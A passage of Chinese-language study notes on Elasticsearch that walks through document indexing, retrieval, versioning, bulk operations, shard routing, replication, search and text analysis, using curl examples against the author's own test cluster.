当我们杀掉Node 2，我们的程序依然可以在没有丢失数据的情况下继续运行，因为Node 3还有每个分片的拷贝。
如果我们重启Node 1，集群将能够重新分配丢失的复制分片，如果Node 1依旧有旧分片的拷贝，它将会尝试再利用它们，它只会从主分片上复制在故障期间有数据变更的那一部分。

第三章 数据吞吐
实际生活中被组织起来、与实际个体、对象相对应的数据才有意义。面向对象编程语言用对象来表示和处理现实生活中那些有着潜在关系和复杂结构的实体。然而，使用关系型数据库去存储这些实体对象使得它们的灵活性不复存在。
对象(object)是一种语言相关，记录在内存中的的数据结构。为了在网络间发送，或者存储它，需要一些标准的格式来表示它。JSON是一种可读的以文本来表示对象的方式。它已经成为NoSQL世界中数据交换的一种事实标准。当对象被序列化为JSON，它就成为JSON文档(JSON document)了。
Elasticsearch是一个分布式的文档(document)存储引擎。它可以实时存储并检索复杂数据结构——序列化的JSON文档。换言说，一旦文档被存储在Elasticsearch中，它就可以在集群的任一节点上被检索。
在Elasticsearch中，每一个字段的数据都是默认被索引的。也就是说，每个字段专门有一个反向索引用于快速检索。而且，与其它数据库不同，它可以在同一个查询中利用所有的这些反向索引，以惊人的速度返回结果。
3.1 什么是文档？
程序中大多的实体或对象能够被序列化为包含键值对的JSON对象。
键(key)——字段(field)或属性(property)
值(value)——字符串、数字、布尔类型、另一个对象、值数组或者其他特殊类型，比如表示日期的字符串或者表示地理位置的对象。
在Elasticsearch中，文档(document)，特指最顶层结构或者根对象(root object)序列化成的JSON数据（以唯一ID标识并存储于Elasticsearch中）。
3.2 文档元数据
一个文档不只有数据。它还包含了元数据(metadata)——关于文档的信息。三个必须的元数据节点是：
|节点      | 说明               
| _index | 文档存储的地方     
| _type  | 文档代表的对象的类 
| _id    | 文档的唯一标识 
 
索引(index)类似于关系型数据库里的“数据库”——它是我们存储和索引关联数据的地方。 

  实际上，数据被存储和索引在分片(shards)中，索引只是一个把一个或多个分片分组在一起的逻辑空间。然而，这只是一些内部细节——我们的程序完全不用关心分片。对于我们的程序而言，文档存储在索引(index)中。
  相同类型(type)的文档表示相同的“事物”，因为他们的数据结构也是相同的,类似于数据库中的“表”。 
  每个类型(type)都有自己的映射(mapping)或者结构定义，就像传统数据库表中的列一样。所有类型下的文档被存储在同一个索引下，但是类型的映射(mapping)会告诉Elasticsearch不同的文档如何被索引。
id仅仅是一个字符串，它与_index和_type组合时，就可以在Elasticsearch中唯一标识一个文档。当创建一个文档可以自定义_id，也可以让Elasticsearch自动生成。

3.3 索引文档
文档通过index API被索引——使数据可以被存储和搜索。
curl -XPUT 'ibd14:9200/website_weichao/blog/123' -d'
{
    "title": "My first blog entry",
    "text":  "Just trying this out...",
    "date":  "2014/01/01"   
}'

上述代码表示：构建了一个索引叫做“website”，类型叫做“blog”，设置的ID是“123”，那么这个索引请求就会被响应、并返回结果如下。
{
     "_type":     "blog",
     "_id":       "123",
     "_version":  1,
     "created":   true  
}'

当文档产生变化时，_version的值增加。构建索引时，如果id值缺省，ES会自动创建一个id。
curl -XPOST 'ibd14:9200/website_weichao/blog/' -d'
{
    "title": "My second blog entry",
    "text":  "Still trying this out...",
    "date":  "2014/01/01"   
}'

3.4 检索文档
（1）从Elasticsearch中获取文档，我们使用同样的_index、_type、_id，但是HTTP方法改为GET：
curl -XGET 'ibd14:9200/website_weichao/blog/123?pretty'

（2）检索文档的一部分
curl -XGET 'ibd14:9200/website_weichao/blog/123?_source=title,text&pretty'

curl -XGET 'ibd14:9200/website_weichao/blog/123?_source&pretty'

3.5 检查稳定是否存在
当只是检查文档是否存在——对内容完全不感兴趣——使用HEAD方法来代替GET。HEAD请求不会返回响应体，只有HTTP头。
curl -i -XHEAD 'ibd14:9200/website_weichao/blog/123'

如果你的文档存在,Elasticsearch将会返回200 OK状态；不存在时返回404 Not Found
curl -i -XHEAD 'ibd14:9200/website_weichao/blog/124'

当然，这只表示你在查询的那一刻文档不存在，但并不表示几毫秒后依旧不存在。另一个进程在这期间可能创建新文档。
3.6 更新整个文档
文档在Elasticsearch中是不可变的——我们不能修改他们。如果需要更新已存在的文档，我们可以使用《索引文档》章节提到的index API 重建索引(reindex) 或者替换掉它。
（1）重新put
curl -XPUT 'ibd14:9200/website_weichao/blog/123' -d'
{
    "title": "My first blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

在响应中，我们可以看到Elasticsearch把_version的值增加了。每重复执行一次上述代码，_version的值就会加1。这说明：
在内部，Elasticsearch已经标记旧文档为删除并添加了一个完整的新文档。
旧版本文档不会立即消失，但也不能去访问它。Elasticsearch会在继续索引更多数据时清理被删除的文档。
（2）update 
update API 似乎 允许你修改文档的局部，但事实上Elasticsearch遵循与之前所说完全相同的过程，这个过程如下：

从旧文档中检索JSON
修改它
删除旧文档
索引新文档

唯一的不同是update API完成这一过程只需要一个客户端请求既可，不再需要get和index请求了。
3.7 创建一个新文档
索引一个文档，如何确定是完全创建了一个新的还是覆盖了一个已经存在的呢？
（1）创建已经存在的文档。
方法一：
curl -XPUT 'ibd14:9200/website_weichao/blog/123?op_type=create' -d'
{
    "title": "My first blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

方法二：
curl -XPUT 'ibd14:9200/website_weichao/blog/123/_create?pretty' -d'
{
    "title": "My first blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

以上两种方法，最后返回的结果都相同，status为409，错误提示：文档已经存在。
（2）创建新文档。
方法一：op_type=create
curl -XPUT 'ibd14:9200/website_weichao/blog/130?op_type=create&pretty' -d'
{
    "title": "My first blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

方法二：
curl -XPUT 'ibd14:9200/website_weichao/blog/130/_create&pretty' -d'
{
    "title": "My first blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

请求成功的创建了一个新文档，Elasticsearch将返回正常的元数据且响应状态码是201 Created。
#
3.8 删除文档
删除文档的语法模式与之前基本一致，只不过要使用DELETE方法
curl -i -XDELET 'ibd14:9200/website_weichao/blog/131?pretty'

如果文档被找到，Elasticsearch将返回200 OK状态码和以下响应体。没找到时返回结果如下所示：
{
    "_index" : "website_weichao",
    "_type" : "blog",
    "_id" : "131",
    "found" : false
}

删除一个文档也不会立即从磁盘上移除，它只是被标记成已删除。Elasticsearch将会在你之后添加更多索引的时候才会在后台进行删除内容的清理。
3.9 处理冲突
Elasticsearch是分布式的。当文档被创建、更新或删除，文档的新版本会被复制到集群的其它节点。Elasticsearch即是同步的又是异步的，意思是这些复制请求都是平行发送的，并无序(out of sequence)的到达目的地。这就需要一种方法确保老版本的文档永远不会覆盖新的版本。
我们利用_version的这一优点确保数据不会因为修改冲突而丢失。我们可以指定文档的version来做想要的更改。如果那个版本号不是现在的(修改的版本号小于当前的版本号)，我们的请求就失败了。
（1）新创建文档，查看返回的状态
curl -XPUT 'ibd14:9200/website_weichao/blog/1?pretty' -d'
{
    "title": "My first blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2016/01/01"   
}'

创建成功，返回200 OK。 
(2)新建文档，加入版本信息
curl -i -XPUT 'ibd14:9200/website_weichao/blog/1?version=1&pretty' -d'
{
    "title": "My third blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

创建成功，返回200 OK，同时_version自增1。
(3)新创建文档，版本信息小于当前版本，报错 409冲突
curl -i -XPUT 'ibd14:9200/website_weichao/blog/1?version=2&pretty' -d'
{
    "title": "My third blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

返回信息：409 conflict
HTTP/1.1 409 Conflict
{
    "error" : {
    "root_cause" : [ {
    "type" : "version_conflict_engine_exception",
    "reason" : "[blog][1]: version conflict, current [3], provided [2]",
    "index" : "website_weichao",
    "shard" : "3"
    } ],
    "type" : "version_conflict_engine_exception",
    "reason" : "[blog][1]: version conflict, current [3], provided [2]",
    "index" : "website_weichao",
    "shard" : "3"
    },
    "status" : 409
}

(4)使用外部版本控制系统
新创建文档，加入外部版本控制系统
curl -i -XPUT 'ibd14:9200/website_weichao/blog/2?version=5&version_type=external' -d'
{
    "title": "My third blog entry",
    "text":  "I am starting to get the hang of this...",
    "date":  "2014/01/02"   
}'

3.10 文档局部更新
文档更新的实质是通过检索，修改，然后重建整文档的索引方法来更新文档。
局部更新了文档的位置，内部却是像我们之前说的一样简单的使用update API处理相同的检索-修改-重建索引流程，我们也减少了其他进程可能导致冲突的修改。
(1)局部更新
curl -i -XPUT 'ibd14:9200/website_weichao/blog/1/_update?pretty' -d'
{
    "doc": {
        "tags":["testing"],
        "views":0
    }   
}'

(2)局部更新后

curl -i -XGET ‘ibd14:9200/website_weichao/blog/1?pretty’

返回信息：
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8
Content-Length: 195
{
  "_index" : "website_weichao",
  "_type" : "blog",
  "_id" : "1",
  "_version" : 5,
  "found" : true,
  "_source" : {
      "tags" : [ "testing" ],
      "views" : 0
  }
}

(3)使用脚本局部更新
curl -i -XPOST 'ibd14:9200/website_weichao/blog/1/_update?pretty' -d'
{
    "script": "ctx._source.views+=1"
}'

在执行脚本进行局部更新之前，把elasticsearch.yml文件进行配置，输入以下配置信息：
script.inline: on
script.indexed: on
script.file: on
script.engine.groovy.inline.aggs: on
script.engine.groovy.inline.update: on

保存后退出vi，然后重启ES。
（4）更新发生冲突后尝试重新更新
POST /website/pageviews/1/_update?retry_on_conflict=5 <1>
{
   "script" : "ctx._source.views+=1",
   "upsert": {
       "views": 0
  }
}

3.11 检索多个文档
Elasticsearch检索多个文档依旧非常快。同时合并多个请求可以避免每个请求单独的网络开销。检索多个文档，使用multi-get或者mget API。
(1)使用mgetAPI的doc参数检索多个文档

curl -i -XGET 'ibd14:9200/_mget?pretty' -d'
{
    "docs" : [
        {
            "_index" : "website_weichao",
            "_type" :  "blog",
            "_id" :    2
        },
        {
            "_index" : "website_weichao",
            "_type" :  "blog",
            "_id" :    1,
            "_source": "doc"
        }
    ]
}'


响应体也包含一个docs数组，每个文档还包含一个响应，它们按照请求定义的顺序排列。每个这样的响应与单独使用get request响应体相同
(2)检索同一index或同一type的多个文档
curl -i -XGET 'ibd14:9200/website_weichao/blog/_mget?pretty' -d'
{
    "docs" : [
        {
            "_id" :    2
        },
        {
            "_id" :    1,
            "_source": "doc"
        }
    ]
}'

（3）检索同一type下的不同id的文档
> 
    curl -i -XGET ‘ibd14:9200/website_weichao/blog/_mget?pretty’ -d’ 
    { 
        “ids” : [“2”,”1”,”202”] 
    }’
尽管前面提到有一个文档没有被找到，但HTTP请求状态码还是200。事实上，就算所有文档都找不到，请求也还是返回200，原因是mget请求本身成功了。如果想知道每个文档是否都成功了，需要检查found标志。
3.12 更省时的批量操作
bulk API允许我们使用单一请求来实现多个文档的create、index、update或delete。这对索引类似于日志活动这样的数据流非常有用，它们可以以成百上千的数据为一个批次按序进行索引。
行为(action)必须是以下几种：
| 行为     | 解释                                                   
—————————————————— |
| create | 当文档不存在时创建之。详见《创建文档》 
| index  | 创建新文档或替换已有文档。见《索引文档》和《更新文档》 
| update | 局部更新文档。见《局部更新》                           
| delete | 删除一个文档。见《删除文档》                           
在索引、创建、更新或删除时必须指定文档的_index、_type、_id这些元数据(metadata)。
*使用mget bulk批量操作不同文档
curl -i XPOST 'ibd14:9200/_bulk?pretty' -d'
    { "delete": { "_index": "website", "_type": "blog", "_id": "123" }}
    { "create": { "_index": "website", "_type": "blog", "_id": "123" }}
    { "title":    "My first blog post" }
    { "index":  { "_index": "website", "_type": "blog" }}
    { "title":    "My second blog post" }
    { "update": { "_index": "website", "_type": "blog", "_id": "123", "_retry_on_conflict" : 3} }
    { "doc" : {"title" : "My updated blog post"} }
'

 









《读书报告 – Elasticsearch入门 》
'


第四章 分布式文件存储
这章的主要内容是理解数据如何在分布式系统中存储。
4.1 路由文档到分片
创建一个新文档时，它是如何确定应该存储在分片1还是分片2上的呢？
这个过程不是随机的，因为将来要检索文档。事实上，它根据一个简单的算法决定：
shard = hash(routing) % number_of_primary_shards

routing值是一个任意字符串，它默认是_id但也可以自定义。这个routing字符串通过哈希函数生成一个数字，然后除以主切片的数量得到一个余数(remainder)，余数的范围永远是0到number_of_primary_shards - 1，这个数字就是特定文档所在的分片。
这也解释了为什么主分片的数量只能在创建索引时定义且不能修改：如果主分片的数量在未来改变了，所有先前的路由值就失效了，文档也就永远找不到了。
所有的文档API（get、index、delete、bulk、update、mget）都接收一个routing参数，它用来自定义文档到分片的映射。自定义路由值可以确保所有相关文档——例如属于同一个人的文档——被保存在同一分片上。
4.2 主分片和复制分片的交互
假设有三个节点的集群Node 1、Node 2、Node 3。它包含一个叫做blogs的索引并拥有两个主分片。每个主分片有两个复制分片。相同的分片不会放在同一个节点上。
我们能够发送请求给集群中任意一个节点。每个节点都有能力处理任意请求。每个节点都知道任意文档所在的节点，所以也可以将请求转发到需要的节点。下面的例子中，我们将发送所有请求给Node 1，这个节点我们将会称之为请求节点(requesting node)
> 
    当我们发送请求，最好的做法是循环通过所有节点请求，这样可以平衡负载。
4.3 新建、索引和删除文档
新建、索引和删除请求都是写(write)操作，它们必须在主分片上成功完成才能复制到相关的复制分片上。
下面是在主分片和复制分片上成功新建、索引或删除一个文档必要的顺序步骤：

客户端给Node 1发送新建、索引或删除请求。
节点使用文档的_id确定文档属于分片0。它转发请求到Node 3，分片0位于这个节点上。
Node 3在主分片上执行请求，如果成功，它转发请求到相应的位于Node 1和Node 2的复制节点上。当所有的复制节点报告成功，Node 3报告成功到请求的节点，请求的节点再报告给客户端。

客户端接收到成功响应的时候，文档的修改已经被应用于主分片和所有的复制分片。这时修改就生效了。
- consistency
默认主分片在尝试写入时需要规定数量(quorum)或过半的分片（可以是主节点或复制节点）可用。这是防止数据被写入到错的网络分区。规定的数量计算公式如下：
int( (primary + number_of_replicas) / 2 ) + 1

consistency允许的值为one（只有一个主分片），all（所有主分片和复制分片）或者默认的quorum或过半分片。
注意number_of_replicas是在索引中的设置，用来定义复制分片的数量，而不是现在活动的复制节点的数量。如果你定义了索引有3个复制节点，那规定数量是：
int( (primary + 3 replicas) / 2 ) + 1 = 3

但如果只有2个节点，那你的活动分片不够规定数量，也就不能索引或删除任何文档。
-timeout
当分片副本不足时会怎样？Elasticsearch会等待更多的分片出现。默认等待一分钟。如果需要，你可以设置timeout参数让它终止的更早：100表示100毫秒，30s表示30秒。

新索引默认有1个复制分片，这意味着为了满足quorum的要求需要两个活动的分片。当然，这个默认设置将阻止我们在单一节点集群中进行操作。为了避开这个问题，规定数量只有在number_of_replicas大于一时才生效。

4.4 检索文档
文档能够从主分片或任意一个复制分片被检索。
下面是在主分片或复制分片上检索一个文档必要的顺序步骤：

客户端给Node 1发送get请求。
节点使用文档的_id确定文档属于分片0。分片0对应的复制分片在三个节点上都有。此时，它转发请求到Node 2。
Node 2返回document给Node 1然后返回给客户端。

可能的情况是，一个被索引的文档已经存在于主分片上却还没来得及同步到复制分片上。这时复制分片会报告文档未找到，主分片会成功返回文档。一旦索引请求成功返回给用户，文档则在主分片和复制分片都是可用的。
4.5 局部更新文档
update API 结合了之前提到的读和写的模式。
下面是执行局部更新必要的顺序步骤：

客户端给Node 1发送更新请求。
它转发请求到主分片所在节点Node 3。
Node 3从主分片检索出文档，修改_source字段的JSON，然后在主分片上重建索引。如果有其他进程修改了文档，它以retry_on_conflict设置的次数重复步骤3，都未成功则放弃。
如果Node 3成功更新文档，它同时转发文档的新版本到Node 1和Node 2上的复制节点以重建索引。当所有复制节点报告成功，Node 3返回成功给请求节点，然后返回给客户端。

update API还接受《新建、索引和删除》章节提到的routing、replication、consistency和timout参数。

基于文档的复制
当主分片转发更改给复制分片时，并不是转发更新请求，而是转发整个文档的新版本。记住这些修改转发到复制节点是异步的，它们并不能保证到达的顺序与发送相同。如果Elasticsearch转发的仅仅是修改请求，修改的顺序可能是错误的，那得到的就是个损坏的文档。

4.6 多文档模式
mget和bulk API与单独的文档类似，差别是请求节点知道每个文档所在的分片。它把多文档请求拆成每个分片的对文档请求，然后转发每个参与的节点。
一旦接收到每个节点的应答，然后整理这些响应组合为一个单独的响应，最后返回给客户端。 
-mget
通过一个mget请求检索多个文档的顺序步骤：

客户端向Node 1发送mget请求。
Node 1为每个分片构建一个多条数据检索请求，然后转发到这些请求所需的主分片或复制分片上。当所有回复被接收，Node 1构建响应并返回给客户端。

routing 参数可以被docs中的每个文档设置。
-bulk
使用一个bulk执行多个create、index、delete和update请求的顺序步骤：

客户端向Node 1发送bulk请求。
Node 1为每个分片构建批量请求，然后转发到这些请求所需的主分片上。
主分片一个接一个的按序执行操作。当一个操作执行完，主分片转发新文档（或者删除部分）给对应的复制节点，然后执行下一个操作。复制节点为报告所有操作完成，节点报告给请求节点，请求节点整理响应并返回给客户端。

bulk API还可以在最上层使用replication和consistency参数，routing参数则在每个请求的元数据中使用。
-bonus
“为什么bulk API需要带换行符的奇怪格式，而不是像mget API一样使用JSON数组？”
为了回答这个问题，我们需要简单的介绍一下背景：
批量中每个引用的文档属于不同的主分片，每个分片可能被分布于集群中的某个节点上。 操作(action)需要被转发到对应的分片和节点上。
如果每个单独的请求被包装到JSON数组中，那意味着我们需要：

解析JSON为数组（包括文档数据，可能非常大）
检查每个请求决定应该到哪个分片上
为每个分片创建一个请求的数组
序列化这些数组为内部传输格式
发送请求到每个分片

这可行，但需要大量的RAM来承载本质上相同的数据，还要创建更多的数据结构使得JVM花更多的时间执行垃圾回收。
取而代之的，Elasticsearch则是从网络缓冲区中一行一行的直接读取数据。它使用换行符识别和解析action/metadata行，以决定哪些分片来处理这个请求。
这些行请求直接转发到对应的分片上。这些没有冗余复制，没有多余的数据结构。整个请求过程使用最小的内存在进行。

第五章 搜索——基本的工具
Elasticsearch真正强大之处在于可以从混乱的数据中找出有意义的信息——从大数据到全面的信息。
Elasticsearch不只是存储(store)文档，也会索引(indexes)文档内容来使之可以被搜索。
每个文档里的字段都会被索引并被查询。而且在简单查询时，Elasticsearch可以使用所有的索引，以非常快的速度返回结果。
搜索(search)可以：

在类似于gender或者age这样的字段上使用结构化查询，join_date这样的字段上使用排序，就像SQL的结构化查询一样。
全文检索，可以使用所有字段来匹配关键字，然后按照关联性(relevance)排序返回结果。
或者结合以上两条。

很多搜索都是开箱即用的，为了充分挖掘Elasticsearch的潜力，你需要理解以下三个概念：
|  概念                            | 解释                                                                  
| ——————————- | —————————————– |
| 映射(Mapping)               | 数据在每个字段中的解释说明                                            |
| 分析(Analysis)              | 全文是如何处理的可以被搜索的                                           |
| 领域特定语言查询(Query DSL)  | Elasticsearch使用的灵活的、强大的查询语言 |
5.1 空搜索
最基本的搜索API表单是空搜索(empty search)，它没有指定任何的查询条件，只返回集群索引中的所有文档：

curl -XGET ‘ibd14:9200/_search?pretty’

- hits
响应中最重要的部分是hits，它包含了total字段来表示匹配到的文档总数，hits数组还包含了匹配到的前10条数据。
hits数组中的每个结果都包含_index、_type和文档的_id字段，被加入到_source字段中这意味着在搜索结果中我们将可以直接使用全部文档。
每个节点都有一个_score字段，这是相关性得分(relevance score)，它衡量了文档与查询的匹配程度。默认的，返回的结果中关联性最大的文档排在首位；这意味着，它是按照_score降序排列的。这种情况下，我们没有指定任何查询，所以所有文档的相关性是一样的，因此所有结果的_score都是取得一个中间值1
max_score指的是所有文档匹配查询中_score的最大值。
-  took
took告诉我们整个搜索请求花费的毫秒数。
-  shards
_shards节点告诉我们参与查询的分片数（total字段），有多少是成功的（successful字段），有多少的是失败的（failed字段）。通常我们不希望分片失败，不过这个有可能发生。如果我们遭受一些重大的故障导致主分片和复制分片都故障，那这个分片的数据将无法响应给搜索请求。这种情况下，Elasticsearch将报告分片failed，但仍将继续返回剩余分片上的结果。
-  timeout
time_out值告诉我们查询超时与否。一般的，搜索请求不会超时。如果响应速度比完整的结果更重要，你可以定义timeout参数为10或者10ms（10毫秒），或者1s（1秒）

curl -XGET ‘ibd14:9200/_search?timeout=10ms&pretty’

Elasticsearch将返回在请求超时前收集到的结果。
超时不是一个断路器（circuit breaker）（译者注：关于断路器的理解请看警告）。

警告
需要注意的是timeout不会停止执行查询，它仅仅告诉你目前顺利返回结果的节点然后关闭连接。在后台，其他分片可能依旧执行查询，尽管结果已经被发送。
使用超时是因为对于你的业务需求（译者注：SLA，Service-Level Agreement服务等级协议，在此我翻译为业务需求）来说非常重要，而不是因为你想中断执行长时间运行的查询。

5.2 多索引和多类别
通过限制搜索的不同索引或类型，我们可以在集群中跨所有文档搜索。Elasticsearch转发搜索请求到集群中平行的主分片或每个分片的复制分片上，收集结果后选择顶部十个返回给我们。
通常，当然，你可能想搜索一个或几个自定的索引或类型，我们能通过定义URL中的索引或类型达到这个目的，像这样：
/_search
在所有索引的所有类型中搜索
/gb/_search
在索引gb的所有类型中搜索
/gb,us/_search
在索引gb和us的所有类型中搜索
/g*,u*/_search
在以g或u开头的索引的所有类型中搜索
/gb/user/_search
在索引gb的类型user中搜索
/gb,us/user,tweet/_search
在索引gb和us的类型user和tweet中搜索
/_all/user,tweet/_search
在所有索引的类型user和tweet中搜索 
    search types user and tweet in all indices
搜索一个索引有5个主分片和5个索引各有一个分片**事实上是一样的**。

5.3 分页
（空）搜索语句中，执行返回的结果只有10个文档在hits数组中。如何看到其他文档？
和SQL使用LIMIT关键字返回只有一页的结果一样，Elasticsearch接受from和size参数：
size: 结果数，默认10，指定每页返回的文档数
from: 跳过开始的结果数，默认0，从第几个文档开始
如果你想每页显示5个结果，页码从1到3，那请求如下：
GET /_search?size=5

curl -XGET ‘ibd14:9200/_search?size=5&pretty’

GET /_search?size=5&from=5

curl -XGET ‘ibd14:9200/_search?size=5&from=5&pretty’

GET /_search?size=5&from=10

curl -XGET ‘ibd14:9200/_search?size=5&from=10&pretty’

应该当心分页太深或者一次请求太多的结果。结果在返回前会被排序。但是记住一个搜索请求常常涉及多个分片。每个分片生成自己排好序的结果，它们接着需要集中起来排序以确保整体排序正确。
5.4 简易搜索
search API有两种表单：一种是“简易版”的查询字符串(query string)将所有参数通过查询字符串定义，另一种版本使用JSON完整的表示请求体(request body)，这种富搜索语言叫做结构化查询语句（DSL）
查询字符串搜索对于在命令行下运行点对点(ad hoc)查询特别有用。例如这个语句查询所有索引类型为blog并在tags字段中包含testing字符的文档：

curl -XGET ‘ibd14:9200/_all/blog/_search?q=tags:testing&pretty’

查询所有索引类型为blog并在tags字段中包含testing字符和views字段值为1的文档

curl -XGET ‘ibd14:9200/_all/blog/_search?q=tags:testing+views:1&pretty’

"+"前缀表示语句匹配条件必须被满足。类似的"-"前缀表示条件必须不被满足。所有条件如果没有+或-表示是可选的——匹配越多，相关的文档就越多。
返回包含"testing"字符的所有文档的简单搜索 
> 
    curl -XGET ‘ibd14:9200/_search?q=testing&pretty’
_all字段
当你索引一个文档，Elasticsearch把所有字符串字段值连接起来放在一个大字符串中，它被索引为一个特殊的字段_all。
_all字段对于开始一个新应用时是一个有用的特性。之后，如果你定义字段来代替_all字段，你的搜索结果将更加可控。当_all字段不再使用，你可以停用它。
更复杂的语句
下一个搜索语句：
_all field 
* title字段包含"first"或"second" 
* view大于1 
* _all字段包含"entry"或"pretty"

curl -XGET ‘ibd14:9200/_search?q=title:(first+second)+views>1+(entry+trying)&pretty’

从上面的例子，看到了简单(lite)查询字符串搜索惊人的强大。 
然而，也看到简洁带来了隐晦和调试困难。而且它很脆弱——查询字符串中一个细小的语法错误，像-、:、/或"错位就会导致返回错误而不是结果。

第六章 映射与分析
映射(mapping)机制用于进行字段类型确认，将每个字段匹配为一种确定的数据类型(string, number, booleans, date等)。
分析(analysis)机制用于进行全文文本(Full Text)的分词，以建立供搜索用的反向索引。
6.1 映射及分析
在已有的索引中有12个tweets，只有一个包含日期2014-09-15，但是我们看看下面查询中的total hits。

GET /_search?q=2014              # 12 个结果 
      GET /_search?q=2014-09-15        # 还是 12 个结果 ! 
      GET /_search?q=date:2014-09-15   # 1  一个结果 
      GET /_search?q=date:2014         # 0  个结果 !

为什么全日期的查询返回所有的tweets，而针对date字段进行年度查询却什么都不返回？ 
为什么我们的结果因查询_all字段(译者注：默认所有字段中进行查询)或date字段而变得不同？
让我们看看Elasticsearch在对website_weichao索引中的blog类型进行mapping(也称之为模式定义[注：此词有待重新定义(schema definition)])后是如何解读我们的文档结构：
{
  "website_weichao" : {
"mappings" : {
  "blog" : {
    "properties" : {
      "date" : {
        "type" : "date",
        "format" : "yyyy/MM/dd HH:mm:ss||yyyy/MM/dd||epoch_millis"
      },
      "doc" : {
        "properties" : {
          "tags" : {
            "type" : "string"
          },
          "views" : {
            "type" : "long"
          }
        }
      },
      "script" : {
        "type" : "string"
      },
      "tags" : {
        "type" : "string"
      },
      "text" : {
        "type" : "string"
      },
      "title" : {
        "type" : "string"
      },
      "views" : {
        "type" : "long"
      }
    }
  }
}

Elasticsearch为对字段类型进行猜测，动态生成了字段和类型的映射关系。返回的信息显示了date字段被识别为date类型。_all因为是默认字段所以没有在此显示，不过我们知道它是string类型。
date类型的字段和string类型的字段的索引方式是不同的，因此导致查询结果的不同，这并不会让我们觉得惊讶。
6.2 确切值 vs 全文文本
Elasticsearch中的数据可以大致分为两种类型：
确切值   及  全文文本

确切值是确定的，正如它的名字一样。比如一个date或用户ID，也可以包含更多的字符串比如username或email地址。确切值能够被准确地查询到。
全文文本常常被称为非结构化数据，其实是一种用词不当的称谓，实际上自然语言是高度结构化的。对于全文数据的查询来说，却有些微妙。我们不会去询问这篇文档是否匹配查询要求？。我们会询问这篇文档和查询的匹配程度如何？。换句话说，对于查询条件，这篇文档的相关性有多高？

为了方便在全文文本字段中进行这些类型的查询，Elasticsearch首先对文本分析(analyzes)，然后使用结果建立一个倒排索引。
6.3 倒排索引
创建倒排索引，我们首先切分每个文档的content字段为单独的单词，把所有的唯一词放入列表并排序。
使用相同的标准化规则处理查询字符串的content字段。把这一过程叫做分词。

IMPORTANT
这很重要。你只可以找到确实存在于索引中的词，所以索引文本和查询字符串都要标准化为相同的形式。

这个标记化和标准化的过程叫做分词(analysis)，这个在下节中我们讨论。
6.4 分析和分析器
分析(analysis)过程：

首先，标记化一个文本块为适用于倒排索引单独的词(term)
然后标准化这些词为标准形式，提高它们的“可搜索性”或“查全率”

这个工作是分析器(analyzer)完成的。
字符过滤器
首先字符串经过字符过滤器(character filter)，它们的工作是在标记化前处理字符串。字符过滤器能够去除HTML标记，或者转换"&"为"and"。
分词器
分词器(tokenizer)的作用是标记化成独立的词。一个简单的分词器(tokenizer)可以根据空格或逗号将单词分开（译者注：这个在中文中不适用）。
标记过滤
最后，每个词都通过所有标记过滤(token filters)，它可以修改词（如将"Quick"转为小写），去掉词（例如停用词像"a"、"and"、"the"等等），或者增加词（例如同义词像"jump"和"leap"） 
Elasticsearch提供很多开箱即用的字符过滤器，分词器和标记过滤器。这些可以组合来创建自定义的分析器以应对不同的需求。
内建的分析器
不过，Elasticsearch还附带了一些预装的分析器，你可以直接使用它们。下面我们列出了最重要的几个分析器，来演示这个字符串分词后的表现差异：
"Set the shape to semi-transparent by calling set_trans(5)"

标准分析器
标准分析器是Elasticsearch默认使用的分析器。对于文本分析，它对于任何语言都是最佳选择（译者注：就是没啥特殊需求，对于任何一个国家的语言，这个分析器就够用了）。它根据Unicode Consortium的定义的单词边界(word boundaries)来切分文本，然后去掉大部分标点符号。最后，把所有词转为小写。产生的结果为：
set, the, shape, to, semi, transparent, by, calling, set_trans, 5

简单分析器
简单分析器将非单个字母的文本切分，然后把每个词转为小写。产生的结果为：
set, the, shape, to, semi, transparent, by, calling, set, trans

空格分析器
空格分析器依据空格切分文本。它不转换小写。产生结果为：
Set, the, shape, to, semi-transparent, by, calling, set_trans(5)

语言分析器
特定语言分析器适用于很多语言。它们能够考虑到特定语言的特性。例如，english分析器自带一套英语停用词库——像and或the这些与语义无关的通用词。这些词被移除后，因为语法规则的存在，英语单词的主体含义依旧能被理解（译者注：stem English words这句不知道该如何翻译，查了字典，我理解的大概意思应该是将英语语句比作一株植物，去掉无用的枝叶，主干依旧存在，停用词好比枝叶，存在与否并不影响对这句话的理解。）。
english分析器将会产生以下结果：
set, shape, semi, transpar, call, set_tran, 5

注意"transparent"、"calling"和"set_trans"是如何转为词干的。
当分析器被使用
当我们索引(index)一个文档，全文字段会被分析为单独的词来创建倒排索引。不过，在全文字段搜索(search)时，查询字符串经过同样的分析流程处理，以确保这些词在索引中存在。

查询全文(full text)字段，查询将使用相同的分析器来分析查询字符串，以产生正确的词列表。
查询一个确切值(exact value)字段，查询将不分析查询字符串，但是你可以自己指定。

现在可以明白为什么《映射和分析》的开头会产生那种结果： 
* date字段包含一个确切值：单独的一个词"2014-09-15"。 
* _all字段是一个全文字段，所以分析过程将日期转为三个词："2014"、"09"和"15"。
当我们在_all字段查询2014，它一个匹配到12条推文，因为这些推文都包含词2014：

GET /_search?q=2014              # 12 results

当我们在_all字段中查询2014-09-15，首先分析查询字符串，产生匹配任一词2014、09或15的查询语句，它依旧匹配12个推文，因为它们都包含词2014。

GET /_search?q=2014-09-15        # 12 results !

当我们在date字段中查询2014-09-15，它查询一个确切的日期，然后只找到一条推文：

GET /_search?q=date:2014-09-15   # 1  result

当我们在date字段中查询2014，没有找到文档，因为没有文档包含那个确切的日期：

GET /_search?q=date:2014         # 0  results !

测试分析器
尤其当你是Elasticsearch新手时，对于如何分词以及存储到索引中理解起来比较困难。为了更好的理解如何进行，你可以使用analyze API来查看文本是如何被分析的。在查询字符串参数中指定要使用的分析器，被分析的文本做为请求体：

curl -XGET ‘ibd14:9200/_analyze?analyzer=standard&text=Starting+to+get&pretty’

结果中每个节点在代表一个词：
{
        "tokens" : [ {
        "token" : "starting",
        "start_offset" : 0,
